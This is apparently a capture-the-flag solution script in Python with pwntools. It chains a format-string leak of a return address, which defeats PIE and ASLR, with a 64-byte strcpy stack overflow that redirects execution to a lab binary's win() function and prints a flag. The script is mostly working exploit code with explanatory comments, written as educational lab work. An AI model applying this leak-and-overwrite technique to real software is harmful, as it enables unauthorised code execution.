#!/usr/bin/env python3
"""
Exploit for level1_decoder (PIE + ASLR, no canary).

Bugs used (see level1_decoder.c comments):
  BUG 1: parse_header() does printf(raw_header) -> format-string leak.
  BUG 2: strcpy(buf, raw_header) into a 64-byte stack buffer -> overflow
         of parse_header's saved return address.

Static facts taken from `objdump -d level1_decoder` (offsets are fixed in
the PIE image, only the runtime *base* is randomized per process):
  - main+0x5a == 0x128e is the return address pushed onto the stack for
    the call to parse_header (`call 11be <parse_header>` at 0x1289, next
    insn at 0x128e).
  - win() is at static offset 0x1199.
  - buf sits at rbp-0x40, saved rbp at rbp+0, return address at rbp+8.
    So overflow layout is: 64 bytes filler (buf) + 8 bytes (saved rbp,
    don't care) + 8 bytes (new return address) = 80 bytes total.

Finding the right %N$p index was empirical, not guessed: swept "%1$p"
through "%39$p" (joined in one line) and compared each printed value's
low 3 hex digits against main+0x128e's expected 0x28e (a page-aligned
PIE base contributes zero bits there, so a real leak of that return
address must end in ...28e regardless of ASLR). Field 17 matched on
every run. IMPORTANT: that sweep line itself is >64 bytes, so sending
it also triggers BUG 2 (stack buffer overflow) on the *same* line before
stage 2 ever runs, corrupting the return address with garbage and
crashing the process on that call's own `ret` — verified by trying it,
the process died before stage 2 could be sent. The fix: stage 1 uses
the bare 5-byte "%17$p" (not the full sweep) to stay well under 64
bytes and not touch BUG 2 yet. Re-verified across several fresh runs
that a lone "%17$p" reads the same slot as it did inside the sweep
(same index, same value shape) — it does, consistently landing on
main+0x128e's runtime address.

Chain (two lines, one process, matching the file's own design doc):
  1. Send "%17$p" -> leaks main+0x128e's *runtime* address -> PIE base
     = leak - 0x128e -> win() runtime addr = base + 0x1199.
  2. Send the 80-byte overflow with win()'s address as the fake return
     address. When parse_header() returns, it jumps into win() instead.
"""
from pwn import process, p64, context

context.log_level = "error"  # keep stdout clean; we print what matters ourselves

RET_SITE_OFFSET = 0x128e   # main's return address after `call parse_header`
WIN_OFFSET = 0x1199        # win()'s static offset in the PIE image
FMT_ARG_INDEX = 17         # position of that saved return addr in printf's varargs


def exploit():
    io = process("./level1_decoder")

    # --- Stage 1: leak a PIE code pointer via the format-string bug ---
    io.sendline(f"%{FMT_ARG_INDEX}$p".encode())
    leak_line = io.recvline(timeout=5).decode().strip()
    leak = int(leak_line, 16)

    base = leak - RET_SITE_OFFSET
    win_addr = base + WIN_OFFSET

    # sanity: PIE base must be page-aligned
    assert base & 0xfff == 0, f"leak didn't look like the expected return address: {hex(leak)}"

    # --- Stage 2: overflow parse_header's saved return address ---
    payload = b"A" * 64 + b"B" * 8 + p64(win_addr)
    io.sendline(payload)

    # Drain remaining output (the "Parsed header: ..." echo, then win()'s output)
    out = io.recvall(timeout=3)

    print(f"[leak] main+0x128e runtime addr = {hex(leak)}")
    print(f"[calc] PIE base                 = {hex(base)}")
    print(f"[calc] win() runtime addr       = {hex(win_addr)}")
    print("---- program output ----")
    print(out.decode(errors="replace"))

    io.close()
    return b"FLAG{" in out


if __name__ == "__main__":
    ok = exploit()
    print("SUCCESS" if ok else "FAILED")
    raise SystemExit(0 if ok else 1)
